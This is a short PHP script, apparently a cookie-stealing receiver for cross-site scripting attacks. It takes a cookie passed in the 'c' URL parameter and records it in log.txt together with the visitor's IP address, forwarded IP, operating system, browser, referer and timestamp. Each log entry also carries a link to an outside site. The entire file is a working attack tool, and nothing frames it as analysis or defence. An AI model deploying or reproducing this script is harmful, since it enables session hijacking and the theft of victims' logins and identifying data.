<?php
/*
PHP Old style since 2008
by: Os555
*/

$ip = getEnv( "REMOTE_ADDR" ); 
    $port = getEnv("REMOTE_PORT"); 
    $realip = getenv("HTTP_X_FORWARDED_FOR"); 
    $hn = gethostbyaddr($_SERVER["REMOTE_ADDR"]); 
    $uagent = getenv("HTTP_USER_AGENT"); 
    $var = $uagent; 

    if(empty($realip)) 
        { 
            $rip = $ip; 
        } 
        else if($ip!=$realip) 
        { 
            $rip = $realip; 
        } 
        else if($ip==$realip) 
        { 
            $rip = $ip; 
        } 
        else if(isset($hcip))   
        { 
             $rip = $hcip; 
        } 
        elseif (isset($hshcip))   
        { 
            $rip = $hshcip; 
        } 
        elseif ($ghcip)   
        { 
            $rip = $ghcip; 
        } 
          

    if (preg_match("/windows nt 5.1/i",$var)) $temp0 = 'Windows XP'; 
    elseif (preg_match("/windows xp/i",$var)) $temp0 = 'Windows XP'; 
    elseif (preg_match("/fedora/i",$var)) $temp0 = 'Fedora Linux'; 
    elseif (preg_match("/SUSE/i",$var)) $temp0 = 'SUS Linux'; 
    elseif (preg_match("/Mandriva/i",$var)) $temp0 = 'Mandriva Linux'; 
    elseif (preg_match("/linux/i",$var)) $temp0 = 'Linux'; 
    elseif (preg_match("/redhat/i",$var)) $temp0 = 'RedHat Linux'; 
    elseif (preg_match("/centos5/i",$var)) $temp0 = 'CentOS 5'; 
    elseif (preg_match("/centos4/i",$var)) $temp0 = 'CentOS 4'; 
    elseif (preg_match("/centos3/i",$var)) $temp0 = 'CentOS 3'; 
    elseif (preg_match("/centos2/i",$var)) $temp0 = 'CentOS 2'; 
    elseif (preg_match("/CentOS/i",$var)) $temp0 = 'CentOS'; 
    elseif (preg_match("/macintosh/i",$var)) $temp0 = 'Macintosh'; 
    elseif (preg_match("/win 9x 4.90/i",$var)) $temp0 = 'Windows Me'; 
    elseif (preg_match("/windows me/i",$var)) $temp0 = 'Windows Me'; 
    elseif (preg_match("/windows nt 5.0/i",$var)) $temp0 = 'Windows 2000'; 
    elseif (preg_match("/windows 2000/i",$var)) $temp0 = 'Windows 2000'; 
    elseif (preg_match("/windows nt 5.2/i",$var)) $temp0 = 'Windows 2003 Server'; 
    elseif (preg_match("/windows nt 3.1/i",$var)) $temp0 = 'Windows 3.1'; 
    elseif (preg_match("/windows nt 3.5.0/i",$var)) $temp0 = 'Windows NT 3.5'; 
    elseif (preg_match("/windows nt 3.5.1/i",$var)) $temp0 = 'Windows NT 3.5.1'; 
    elseif (preg_match("/windows nt 4.0/i",$var)) $temp0 = 'Windows NT 4.0'; 
    elseif (preg_match("/windows 98/i",$var)) $temp0 = 'Windows 98'; 
    elseif (preg_match("/windows 95/i",$var)) $temp0 = 'Windows 95'; 
    elseif (preg_match("/sunos/i",$var)) $temp0 = 'SunOS'; 
    else $temp0 = $var2; 


    ### operating browser detection ### 

    if (preg_match("/Opera\/9.10/i",$var)) $temp = 'Opera 9.10'; 
    elseif (preg_match("/Opera\/9.02/i",$var)) $temp = 'Opera 9.02'; 
    elseif (preg_match("/Opera\/9/i",$var)) $temp = 'Opera 9'; 
    elseif (preg_match("/Opera/i",$var)) $temp = 'Opera'; 
    elseif (preg_match("/Firefox\/2.0.0.1/i",$var)) $temp = 'Mozilla Firefox 2.0.0.1'; 
    elseif (preg_match("/Firefox\/2.0/i",$var)) $temp = 'Mozilla Firefox 2.0'; 
    elseif (preg_match("/Firefox\/1.5.1.0/i",$var)) $temp = 'Mozilla Firefox 1.5.1.0'; 
    elseif (preg_match("/Firefox\/1.5.0.9/i",$var)) $temp = 'Mozilla Firefox 1.5.0.9'; 
    elseif (preg_match("/Firefox\/1.5.0.8/i",$var)) $temp = 'Mozilla Firefox 1.5.0.8'; 
    elseif (preg_match("/Firefox\/1.5.0.7/i",$var)) $temp = 'Mozilla Firefox 1.5.0.7'; 
    elseif (preg_match("/Firefox\/1.5.0.6/i",$var)) $temp = 'Mozilla Firefox 1.5.0.6'; 
    elseif (preg_match("/Firefox\/1.5.0.5/i",$var)) $temp = 'Mozilla Firefox 1.5.0.5'; 
    elseif (preg_match("/Firefox\/1.5.0.4/i",$var)) $temp = 'Mozilla Firefox 1.5.0.4'; 
    elseif (preg_match("/Firefox\/1.5.0.3/i",$var)) $temp = 'Mozilla Firefox 1.5.0.3'; 
    elseif (preg_match("/Firefox\/1.5.0.2/i",$var)) $temp = 'Mozilla Firefox 1.5.0.2'; 
    elseif (preg_match("/Firefox\/1.5.0.1/i",$var)) $temp = 'Mozilla Firefox 1.5.0.1'; 
    elseif (preg_match("/Firefox\/1.5/i",$var)) $temp = 'Mozilla Firefox 1.5'; 
    elseif (preg_match("/Firefox/i",$var)) $temp = 'Mozilla Firefox'; 
    elseif (preg_match("/MSIE 7/i",$var)) $temp = 'Internet Explorer 7'; 
    elseif (preg_match("/MSIE 6/i",$var)) $temp = 'Internet Explorer 6'; 
    elseif (preg_match("/MSIE 5.5/i",$var)) $temp = 'Internet Explorer 5.5'; 
    elseif (preg_match("/MSIE 5.0/i",$var)) $temp = 'Internet Explorer 5'; 
    elseif (preg_match("/MSIE 4/i",$var)) $temp = 'Internet Explorer 4'; 
    elseif (preg_match("/Netscape\/7.1/i",$var)) $temp = 'Netscape 7.1'; 
    elseif (preg_match("/Netscape\/7.0/i",$var)) $temp = 'Netscape 7'; 
    elseif (preg_match("/Mozilla\/5.0/i",$var)) $temp = 'Netscape 6'; 
    elseif (preg_match("/Mozilla\/4.7/i",$var)) $temp = 'Netscape 4.7'; 
    elseif (preg_match("/Mozilla\/4.6/i",$var)) $temp = 'Netscape 4.6'; 
    elseif (preg_match("/Mozilla\/4.5/i",$var)) $temp = 'Netscape 4.5'; 
    elseif (preg_match("/rv:1.4/i",$var)) $temp = 'Mozilla 1.4'; 
    elseif (preg_match("/rv:1.5a/i",$var)) $temp = 'Mozilla 1.5a'; 
    elseif (preg_match("/rv:1.5/i",$var)) $temp = 'Mozilla 1.5'; 
    elseif (preg_match("/rv:2.0/i",$var)) $temp = 'Mozilla 2.0'; 
    elseif (preg_match("/rv:3.0/i",$var)) $temp = 'Mozilla 3.0'; 
    elseif (preg_match("/Galeon/i",$var)) $temp = 'Galeon'; 
    elseif (preg_match("/Konqueror/i",$var)) $temp = 'Konqueror'; 
    else $temp = $var2; 


//original
$cookie = str_replace(array(':', '-', '/', '*', '\'', '"', '+', ' '), '', $_GET['c']);
$ip = getenv ('REMOTE_ADDR');
$date=date("j F, Y, g:i a");
$referer=getenv ('HTTP_REFERER');
$fp = fopen('log.txt', 'a'); //Chmode 777 txt file
fwrite($fp, 
'
Cookie: '.$cookie.'<br>
Referer: <a href ="'.$referer.'">'.$referer.'</a><br>
IP: ' .$ip. '<br>
Real IP : '.$rip.'<br> 
Operating System : '.$temp0.' <br>
Browser : '.$temp.' <br>
Date and Time: ' .$date. '<br>
 ---------<a href ="http://www.laozaa.com">www.laozaa.com</a>-----------<br>');
fclose($fp);
?>
